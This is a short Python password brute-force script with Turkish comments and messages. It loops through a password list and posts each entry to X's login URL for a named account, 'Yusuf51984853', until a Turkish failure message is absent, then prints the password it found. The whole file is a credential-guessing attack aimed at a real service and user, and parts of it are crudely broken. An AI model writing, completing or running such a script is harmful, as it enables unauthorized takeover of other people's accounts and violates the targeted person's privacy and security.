import requests
import time

target_url = "https://x.com/i/flow/login"
# ism yada eposta
username = input("Yusuf51984853")
password_file = "passwords.txt"
failed_message = "oturum açma başarısız"
with open(password_file, "r") as passwords:
    for password in passwords:
        password = password.strip()
        payload = {
            "username": username,
            "password": password,
            "queryParams": {},
            "optIntoOneTap": "false"
        }
        response = requests.post(target_url, data=payload)
        if failed_message not in response.content.decode():
            print(f"Şifre bulundu şifre bu: {password}")
            exit()
        print("Şifre bulunamadı")
        time.sleep(7)
